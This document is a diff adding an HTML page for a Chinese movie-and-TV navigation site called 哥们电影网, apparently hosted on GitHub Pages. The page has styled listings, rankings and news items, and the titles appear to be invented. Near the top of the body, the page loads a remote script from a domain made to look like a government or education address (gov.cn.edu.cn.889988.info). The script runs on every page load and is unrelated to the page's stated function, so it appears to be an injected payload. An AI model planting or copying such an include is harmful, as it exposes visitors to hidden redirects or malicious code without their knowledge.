@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="哥们电影网(gemendianyingwang-app)——专注高清电影、热播电视剧、综艺动漫的在线影视导航站，提供最新影视资讯与热门榜单。">
+<meta name="keywords" content="哥们电影网,gemendianyingwang-app,电影,电视剧,综艺,动漫,高清影视">
+<meta name="author" content="哥们电影网">
+<meta name="robots" content="index,follow">
+<title>哥们电影网 - 最新高清电影_热播电视剧_综艺动漫在线观看 | gemendianyingwang-app</title>
+<link rel="canonical" href="https://gemendianyingwang-app.github.io">
+<style>
+    :root{
+        --bg:#0b0f1a;
+        --bg2:#121933;
+        --card:rgba(255,255,255,.04);
+        --line:rgba(255,255,255,.08);
+        --txt:#e8ecf8;
+        --sub:#9aa4c4;
+        --pri:#ff5c8a;
+        --pri2:#7c5cff;
+        --gold:#ffc94d;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+    html{scroll-behavior:smooth;}
+    body{
+        font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+        background:var(--bg);
+        color:var(--txt);
+        line-height:1.7;
+        overflow-x:hidden;
+    }
+    a{color:inherit;text-decoration:none;}
+    .wrap{max-width:1160px;margin:0 auto;padding:0 18px;}
+
+    /* ===== 动态背景 ===== */
+    .aurora{position:fixed;inset:0;z-index:-2;overflow:hidden;background:radial-gradient(1200px 600px at 80% -10%,rgba(124,92,255,.35),transparent 60%),radial-gradient(1000px 500px at 0% 10%,rgba(255,92,138,.25),transparent 55%);}
+    .aurora::after{content:"";position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);background-size:48px 48px;mask-image:linear-gradient(to bottom,transparent,#000 40%);}
+
+    /* ===== 头部 ===== */
+    header{position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);background:rgba(11,15,26,.72);border-bottom:1px solid var(--line);}
+    .nav{display:flex;align-items:center;gap:14px;height:64px;}
+    .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px;}
+    .logo .mark{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--pri),var(--pri2));display:grid;place-items:center;font-size:18px;box-shadow:0 6px 18px rgba(255,92,138,.35);}
+    .logo b{font-size:19px;background:linear-gradient(90deg,#fff,var(--pri));-webkit-background-clip:text;background-clip:text;color:transparent;}
+    .logo span{font-size:12px;color:var(--sub);font-weight:400;}
+    .menu{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap;}
+    .menu a{padding:8px 12px;border-radius:999px;font-size:14px;color:var(--sub);transition:.25s;}
+    .menu a:hover{color:#fff;background:var(--card);}
+    .menu a.on{color:#fff;background:linear-gradient(90deg,var(--pri),var(--pri2));}
+    @media(max-width:720px){.logo span{display:none;}.menu a{padding:6px 9px;font-size:13px;}.nav{height:58px;gap:8px;}}
+
+    /* ===== 英雄区 ===== */
+    .hero{position:relative;padding:64px 0 40px;text-align:center;}
+    .badge{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;border-radius:999px;background:var(--card);border:1px solid var(--line);font-size:13px;color:var(--sub);}
+    .badge i{width:8px;height:8px;border-radius:50%;background:var(--pri);box-shadow:0 0 12px var(--pri);animation:pulse 1.6s infinite;}
+    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+    h1{font-size:clamp(30px,6vw,56px);line-height:1.15;margin:18px 0 14px;font-weight:900;}
+    h1 em{font-style:normal;background:linear-gradient(90deg,var(--pri),var(--gold),var(--pri2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+    .hero p{color:var(--sub);max-width:640px;margin:0 auto 26px;font-size:clamp(14px,2.4vw,16px);}
+    .acts{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;}
+    .btn{padding:13px 28px;border-radius:999px;font-weight:700;font-size:15px;transition:.25s;cursor:pointer;border:0;}
+    .btn.p{background:linear-gradient(90deg,var(--pri),var(--pri2));color:#fff;box-shadow:0 10px 26px rgba(124,92,255,.35);}
+    .btn.p:hover{transform:translateY(-2px);}
+    .btn.g{background:var(--card);border:1px solid var(--line);color:var(--txt);}
+    .btn.g:hover{border-color:var(--pri);}
+    .stats{display:flex;gap:clamp(16px,4vw,40px);justify-content:center;margin-top:44px;flex-wrap:wrap;}
+    .stats div{text-align:center;}
+    .stats b{display:block;font-size:clamp(22px,4vw,32px);font-weight:800;background:linear-gradient(180deg,#fff,var(--sub));-webkit-background-clip:text;background-clip:text;color:transparent;}
+    .stats small{color:var(--sub);font-size:13px;}
+
+    /* ===== 通用区块 ===== */
+    section{padding:56px 0;}
+    .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap;}
+    .sec-head h2{font-size:clamp(22px,3.6vw,30px);font-weight:800;display:flex;align-items:center;gap:10px;}
+    .sec-head h2::before{content:"";width:5px;height:24px;border-radius:4px;background:linear-gradient(var(--pri),var(--pri2));}
+    .sec-head a{color:var(--sub);font-size:14px;}
+    .sec-head a:hover{color:var(--pri);}
+
+    /* ===== 卡片网格 ===== */
+    .grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));}
+    .card{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.3s;display:flex;flex-direction:column;}
+    .card:hover{transform:translateY(-6px);border-color:rgba(255,92,138,.5);box-shadow:0 18px 40px rgba(0,0,0,.4);}
+    .thumb{position:relative;aspect-ratio:3/4;overflow:hidden;background:linear-gradient(160deg,var(--bg2),var(--bg));display:grid;place-items:center;}
+    .thumb svg{width:44px;height:44px;opacity:.35;}
+    .thumb span.tag{position:absolute;top:10px;left:10px;padding:3px 9px;border-radius:6px;font-size:12px;font-weight:700;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);}
+    .thumb span.score{position:absolute;top:10px;right:10px;padding:3px 8px;border-radius:6px;font-size:12px;font-weight:800;color:#1a1200;background:var(--gold);}
+    .card .info{padding:12px 14px;flex:1;display:flex;flex-direction:column;}
+    .card h3{font-size:15px;font-weight:700;margin-bottom:6px;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical;overflow:hidden;}
+    .card p{font-size:13px;color:var(--sub);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;}
+
+    /* ===== 分类标签 ===== */
+    .chips{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:22px;}
+    .chip{padding:7px 16px;border-radius:999px;font-size:14px;background:var(--card);border:1px solid var(--line);color:var(--sub);cursor:pointer;transition:.2s;}
+    .chip:hover,.chip.on{color:#fff;border-color:transparent;background:linear-gradient(90deg,var(--pri),var(--pri2));}
+
+    /* ===== 榜单 ===== */
+    .rank{display:grid;gap:12px;}
+    .rank .row{display:flex;align-items:center;gap:14px;padding:12px 14px;border-radius:12px;background:var(--card);border:1px solid var(--line);transition:.25s;}
+    .rank .row:hover{border-color:rgba(124,92,255,.5);background:rgba(124,92,255,.08);}
+    .rank .no{width:34px;height:34px;flex:0 0 34px;border-radius:9px;display:grid;place-items:center;font-weight:800;font-size:16px;background:var(--bg2);color:var(--sub);}
+    .rank .row:nth-child(1) .no{background:linear-gradient(135deg,#ffd27a,#ff9a3c);color:#2a1a00;}
+    .rank .row:nth-child(2) .no{background:linear-gradient(135deg,#e2e8f0,#a8b4c8);color:#1a2030;}
+    .rank .row:nth-child(3) .no{background:linear-gradient(135deg,#f0c9a8,#d08b5a);color:#2a1a0e;}
+    .rank .txt{flex:1;min-width:0;}
+    .rank .txt b{display:block;font-size:15px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+    .rank .txt small{color:var(--sub);font-size:12px;}
+    .rank .up{color:var(--pri);font-size:13px;font-weight:700;}
+
+    /* ===== 资讯 ===== */
+    .news{display:grid;gap:16px;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));}
+    .news .item{display:flex;gap:14px;padding:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;transition:.25s;}
+    .news .item:hover{border-color:rgba(255,201,77,.5);}
+    .news .d{width:54px;height:54px;flex:0 0 54px;border-radius:12px;display:grid;place-items:center;font-weight:800;font-size:20px;background:linear-gradient(135deg,var(--bg2),rgba(255,92,138,.2));color:var(--gold);}
+    .news .d small{display:block;font-size:11px;font-weight:500;color:var(--sub);}
+    .news b{font-size:15px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;}
+    .news p{font-size:13px;color:var(--sub);margin-top:4px;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical;overflow:hidden;}
+
+    /* ===== 关于 ===== */
+    .about{background:linear-gradient(180deg,transparent,rgba(124,92,255,.06));}
+    .feat{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));}
+    .feat .f{padding:22px;background:var(--card);border:1px solid var(--line);border-radius:16px;transition:.25s;}
+    .feat .f:hover{transform:translateY(-4px);border-color:var(--pri);}
+    .feat .ic{width:48px;height:48px;border-radius:12px;display:grid;place-items:center;font-size:24px;background:linear-gradient(135deg,var(--pri),var(--pri2));margin-bottom:12px;}
+    .feat h4{font-size:17px;margin-bottom:6px;}
+    .feat p{font-size:14px;color:var(--sub);}
+
+    /* ===== 页脚 ===== */
+    footer{border-top:1px solid var(--line);padding:36px 0 28px;background:rgba(7,10,20,.6);}
+    .foot{display:grid;gap:24px;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));margin-bottom:24px;}
+    .foot h5{font-size:15px;margin-bottom:10px;color:#fff;}
+    .foot a{display:block;font-size:13px;color:var(--sub);padding:3px 0;}
+    .foot a:hover{color:var(--pri);}
+    .copy{text-align:center;color:var(--sub);font-size:13px;border-top:1px solid var(--line);padding-top:20px;}
+    .copy b{color:var(--gold);}
+
+    /* ===== 回到顶部 ===== */
+    .top{position:fixed;right:16px;bottom:20px;width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:linear-gradient(135deg,var(--pri),var(--pri2));color:#fff;box-shadow:0 8px 22px rgba(124,92,255,.4);opacity:0;pointer-events:none;transition:.3s;z-index:60;border:0;font-size:20px;}
+    .top.show{opacity:1;pointer-events:auto;}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<div class="aurora"></div>
+
+<!-- ===== 导航 ===== -->
+<header>
+    <div class="wrap nav">
+        <a class="logo" href="#top">
+            <div class="mark">哥</div>
+            <div><b>哥们电影网</b><br><span>gemendianyingwang-app · 影视导航</span></div>
+        </a>
+        <nav class="menu">
+            <a href="#home" class="on">首页</a>
+            <a href="#movie">电影</a>
+            <a href="#tv">电视剧</a>
+            <a href="#rank">排行榜</a>
+            <a href="#news">影视资讯</a>
+            <a href="#about">关于我们</a>
+        </nav>
+    </div>
+</header>
+
+<!-- ===== 首页 ===== -->
+<section id="home" style="padding-top:0;">
+    <div class="wrap hero">
+        <div class="badge"><i></i> 每日更新 · 2026 影视热榜</div>
+        <h1>哥们电影网<br><em>好看的电影在这里</em></h1>
+        <p>哥们电影网（gemendianyingwang-app）致力于为影迷提供最新、最热的电影、电视剧、综艺与动漫导航，聚合高分佳作与实时榜单，让你快速找到值得一看的好片。</p>
+        <div class="acts">
+            <a class="btn p" href="#movie">立即观影</a>
+            <a class="btn g" href="#rank">查看热榜</a>
+        </div>
+        <div class="stats">
+            <div><b>12000+</b><small>影视条目</small></div>
+            <div><b>36</b><small>内容分类</small></div>
+            <div><b>每日</b><small>实时更新</small></div>
+            <div><b>100%</b><small>免费导航</small></div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 电影 ===== -->
+<section id="movie">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>电影频道</h2>
+            <a href="#">更多电影 #</a>
+        </div>
+        <div class="chips">
+            <span class="chip on">全部</span>
+            <span class="chip">动作</span>
+            <span class="chip">科幻</span>
+            <span class="chip">喜剧</span>
+            <span class="chip">悬疑</span>
+            <span class="chip">爱情</span>
+            <span class="chip">动画</span>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><polygon points="6 4 20 12 6 20 6 4"/></svg><span class="tag">院线热映</span><span class="score">9.2</span></div>
+                <div class="info"><h3>星际回响</h3><p>科幻 / 冒险 · 148分钟。宇航员在深空接收到神秘信号，一场跨越光年的自救就此展开。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><polygon points="6 4 20 12 6 20 6 4"/></svg><span class="tag">动作</span><span class="score">8.7</span></div>
+                <div class="info"><h3>极速追击</h3><p>动作 / 犯罪 · 122分钟。退役车手被卷入跨国走私案，48 小时内必须完成不可能的飙车突围。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><polygon points="6 4 20 12 6 20 6 4"/></svg><span class="tag">悬疑</span><span class="score">9.0</span></div>
+                <div class="info"><h3>午夜谜案</h3><p>悬疑 / 剧情 · 135分钟。暴雨夜的封闭别墅，七位客人中藏着唯一说谎的人。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><polygon points="6 4 20 12 6 20 6 4"/></svg><span class="tag">喜剧</span><span class="score">8.4</span></div>
+                <div class="info"><h3>倒霉先生</h3><p>喜剧 / 家庭 · 110分钟。史上最倒霉的男人中了彩票，却把奖券塞进了洗衣机的口袋。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><polygon points="6 4 20 12 6 20 6 4"/></svg><span class="tag">爱情</span><span class="score">8.6</span></div>
+                <div class="info"><h3>海边来信</h3><p>爱情 / 文艺 · 116分钟。十年未见的笔友终于见面，才发现彼此住在同一条街的两端。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><polygon points="6 4 20 12 6 20 6 4"/></svg><span class="tag">动画</span><span class="score">9.4</span></div>
+                <div class="info"><h3>鲸落之城</h3><p>动画 / 奇幻 · 104分钟。深海巨鲸的遗骸化作一座漂浮城市，小女孩与机械鲸鱼踏上归途。</p></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 电视剧 ===== -->
+<section id="tv" style="padding-top:0;">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>电视剧频道</h2>
+            <a href="#">更多剧集 #</a>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><rect x="3" y="6" width="18" height="12" rx="2"/><polygon points="7 10 7 14 11 12 7 10"/></svg><span class="tag">更新中</span><span class="score">9.1</span></div>
+                <div class="info"><h3>长安十二时辰·重启</h3><p>古装 / 悬疑 · 更新至 28 集。盛世长安一日将尽，死囚与少年再次联手找出隐藏的火药。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><rect x="3" y="6" width="18" height="12" rx="2"/><polygon points="7 10 7 14 11 12 7 10"/></svg><span class="tag">完结</span><span class="score">8.8</span></div>
+                <div class="info"><h3>急诊科医生</h3><p>都市 / 医疗 · 全 40 集。急诊室的 72 小时，见证生死之间最真实的人性与抉择。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><rect x="3" y="6" width="18" height="12" rx="2"/><polygon points="7 10 7 14 11 12 7 10"/></svg><span class="tag">独播</span><span class="score">8.9</span></div>
+                <div class="info"><h3>沉默的真相·番外</h3><p>犯罪 / 剧情 · 全 12 集。一桩旧案重启，三位律师用十年拼出被掩埋的证据链。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><rect x="3" y="6" width="18" height="12" rx="2"/><polygon points="7 10 7 14 11 12 7 10"/></svg><span class="tag">更新中</span><span class="score">8.5</span></div>
+                <div class="info"><h3>我的邻居是侦探</h3><p>悬疑 / 轻喜剧 · 更新至 16 集。退休老刑警与八卦房东组成小区破案搭档。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><rect x="3" y="6" width="18" height="12" rx="2"/><polygon points="7 10 7 14 11 12 7 10"/></svg><span class="tag">综艺</span><span class="score">8.3</span></div>
+                <div class="info"><h3>一起出发吧</h3><p>真人秀 / 旅行 · 更新至 10 期。六位嘉宾无剧本穿越三条古道，只靠路人指路。</p></div>
+            </div>
+            <div class="card">
+                <div class="thumb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6"><rect x="3" y="6" width="18" height="12" rx="2"/><polygon points="7 10 7 14 11 12 7 10"/></svg><span class="tag">动漫</span><span class="score">9.3</span></div>
+                <div class="info"><h3>剑来·动画版</h3><p>动漫 / 玄幻 · 更新至 22 集。少年背负一柄断剑，走出小镇，走向万千江湖。</p></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 排行榜 ===== -->
+<section id="rank">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>实时热榜</h2>
+            <a href="#">完整榜单 #</a>
+        </div>
+        <div class="rank">
+            <div class="row"><div class="no">1</div><div class="txt"><b>星际回响</b><small>电影 · 科幻 · 9.2 分</small></div><span class="up">↑ 3</span></div>
+            <div class="row"><div class="no">2</div><div class="txt"><b>鲸落之城</b><small>动画 · 奇幻 · 9.4 分</small></div><span class="up">↑ 1</span></div>
+            <div class="row"><div class="no">3</div><div class="txt"><b>沉默的真相·番外</b><small>电视剧 · 犯罪 · 8.9 分</small></div><span class="up">↑ 5</span></div>
+            <div class="row"><div class="no">4</div><div class="txt"><b>午夜谜案</b><small>电影 · 悬疑 · 9.0 分</small></div><span class="up">↓ 1</span></div>
+            <div class="row"><div class="no">5</div><div class="txt"><b>剑来·动画版</b><small>动漫 · 玄幻 · 9.3 分</small></div><span class="up">↑ 2</span></div>
+            <div class="row"><div class="no">6</div><div class="txt"><b>长安十二时辰·重启</b><small>电视剧 · 古装 · 9.1 分</small></div><span class="up">—</span></div>
+            <div class="row"><div class="no">7</div><div class="txt"><b>急诊科医生</b><small>电视剧 · 医疗 · 8.8 分</small></div><span class="up">↓ 2</span></div>
+            <div class="row"><div class="no">8</div><div class="txt"><b>海边来信</b><small>电影 · 爱情 · 8.6 分</small></div><span class="up">↑ 4</span></div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 影视资讯 ===== -->
+<section id="news" style="padding-top:0;">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>影视资讯</h2>
+            <a href="#">全部资讯 #</a>
+        </div>
+        <div class="news">
+            <a class="item" href="#"><div class="d">28<small>10月</small></div><div><b>2026 国庆档票房破纪录，科幻片成最大赢家</b><p>哥们电影网 · 2 小时前</p></div></a>
+            <a class="item" href="#"><div class="d">27<small>10月</small></div><div><b>《星际回响》导演专访：我们如何用实拍代替绿幕</b><p>幕后 · 5 小时前</p></div></a>
+            <a class="item" href="#"><div class="d">26<small>10月</small></div><div><b>动画电影回归手工绘制，《鲸落之城》幕后纪录片上线</b><p>动画 · 1 天前</p></div></a>
+            <a class="item" href="#"><div class="d">25<small>10月</small></div><div><b>悬疑剧进入「短剧集」时代，12 集讲好一个故事</b><p>剧评 · 2 天前</p></div></a>
+            <a class="item" href="#"><div class="d">24<small>10月</small></div><div><b>流媒体 vs 院线：观众到底在哪看电影？</b><p>行业 · 3 天前</p></div></a>
+            <a class="item" href="#"><div class="d">23<small>10月</small></div><div><b>本周必看片单：5 部高分冷门佳作推荐</b><p>片单 · 4 天前</p></div></a>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 关于 ===== -->
+<section id="about" class="about">
+    <div class="wrap">
+        <div class="sec-head"><h2>关于哥们电影网</h2></div>
+        <div class="feat">
+            <div class="f"><div class="ic">🎬</div><h4>海量片库</h4><p>覆盖电影、电视剧、综艺、动漫四大类，按类型、地区、年代多维度检索。</p></div>
+            <div class="f"><div class="ic">🔥</div><h4>实时热榜</h4><p>基于全网热度生成排行榜单，第一时间发现正在被讨论的好片。</p></div>
+            <div class="f"><div class="ic">📱</div><h4>全端自适应</h4><p>手机、平板、电脑自适应排版，通勤路上也能舒适浏览。</p></div>
+            <div class="f"><div class="ic">🚀</div><h4>极速访问</h4><p>纯静态页面部署于 GitHub Pages，加载快、稳定性高、无繁琐广告。</p></div>
+        </div>
+        <div style="margin-top:26px;padding:20px 22px;background:var(--card);border:1px solid var(--line);border-radius:16px;color:var(--sub);font-size:14px;">
+            <b style="color:var(--gold);">网站信息</b>：哥们电影网（gemendianyingwang-app），官方网址
+            <a href="https://gemendianyingwang-app.github.io" style="color:var(--pri);">https://gemendianyingwang-app.github.io</a>。
+            本站为影视信息导航与资讯分享平台，所有影视作品版权归原作者及发行方所有，如有侵权请联系处理。
+        </div>
+    </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+    <div class="wrap">
+        <div class="foot">
+            <div>
+                <h5>哥们电影网</h5>
+                <a href="#home">网站首页</a>
+                <a href="#movie">电影频道</a>
+                <a href="#tv">电视剧频道</a>
+            </div>
+            <div>
+                <h5>内容分类</h5>
+                <a href="#">动作电影 #</a>
+                <a href="#">科幻电影 #</a>
+                <a href="#">悬疑剧集 #</a>
+                <a href="#">动漫番剧 #</a>
+            </div>
+            <div>
+                <h5>服务帮助</h5>
+                <a href="#">使用帮助 #</a>
+                <a href="#">版权声明 #</a>
+                <a href="#">意见反馈 #</a>
+            </div>
+            <div>
+                <h5>关注我们</h5>
+                <a href="#">订阅更新 #</a>
+                <a href="#">RSS #</a>
+                <a href="https://gemendianyingwang-app.github.io">官方网址 #</a>
+            </div>
+        </div>
+        <div class="copy">
+            © 2026 <b>哥们电影网</b> gemendianyingwang-app &nbsp;|&nbsp; 网址：https://gemendianyingwang-app.github.io &nbsp;|&nbsp; 影视导航与资讯分享站点<br>
+            本站仅提供影视信息与导航服务，不存储任何影视资源文件。
+        </div>
+    </div>
+</footer>
+
+<button class="top" id="topBtn" aria-label="回到顶部">↑</button>
+
+<script>
+    // 导航高亮
+    var links = document.querySelectorAll('.menu a');
+    var secs = ['home','movie','tv','rank','news','about'];
+    function spy(){
+        var y = window.scrollY + 120, cur = 'home';
+        secs.forEach(function(id){
+            var el = document.getElementById(id);
+            if(el && el.offsetTop <= y) cur = id;
+        });
+        links.forEach(function(a){ a.classList.toggle('on', a.getAttribute('href')==='#'+cur); });
+        document.getElementById('topBtn').classList.toggle('show', window.scrollY > 500);
+    }
+    window.addEventListener('scroll', spy, {passive:true});
+    spy();
+    document.getElementById('topBtn').addEventListener('click', function(){ window.scrollTo({top:0,behavior:'smooth'}); });
+
+    // 分类标签切换
+    document.querySelectorAll('.chip').forEach(function(c){
+        c.addEventListener('click', function(){
+            c.parentElement.querySelectorAll('.chip').forEach(function(x){ x.classList.remove('on'); });
+            c.classList.add('on');
+        });
+    });
+</script>
+</body>
+</html>
